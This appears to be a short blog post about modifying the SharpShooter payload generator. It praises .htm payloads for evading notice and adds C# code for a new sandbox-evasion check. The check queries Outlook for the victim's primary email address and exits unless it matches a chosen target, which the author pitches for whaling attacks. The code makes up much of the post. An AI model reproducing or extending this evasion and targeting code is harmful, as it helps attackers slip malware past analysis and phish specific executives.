Thanks Sharpshooter for providing such a excellent tool to generate payload. File with .htm extension is so much easier to go under the radar. 
Although it comes with sandbox evasion, I may not able to use that 4 built-in techniques to distinguish a well-built sandbox from a normal laptop. Then I realized enterprise email account would be a good identifier, if you are doing whaling. Just add a new Case (i.e. 5) and ask outlook for primary address, not credential prompt on client-side~~~

In SharpShooter/CSharpShooterStageless/SharpShooter.cs
```
public void CheckPlease(int check, string arg)
  {
      CheckPlease cp = new CheckPlease();
      switch(check)
      {
          case 0:
              if (!cp.isDomain(arg)) Environment.Exit(1);
              break;
          case 1:
              if (!cp.isDomainJoined()) Environment.Exit(1);
              break;
          case 2:
              if (cp.containsSandboxArtifacts()) Environment.Exit(1);
              break;
          case 3:
              if (cp.isBadMac()) Environment.Exit(1);
              break;
          case 4:
              if (cp.isDebugged()) Environment.Exit(1);
              break;
          case 5:
              if (!cp.isDesignatedEmail(arg)) Environment.Exit(1);
              break;
      }
  }
```

In SharpShooter/CSharpShooterStageless/CheckPlease.cs

```
public bool isDesignatedEmail(String input)
{
    if ((new Outlook.Application()).Session.Accounts[1].SmtpAddress.Equals(input))
    { return true;}
    else { return false; }
}
``` 
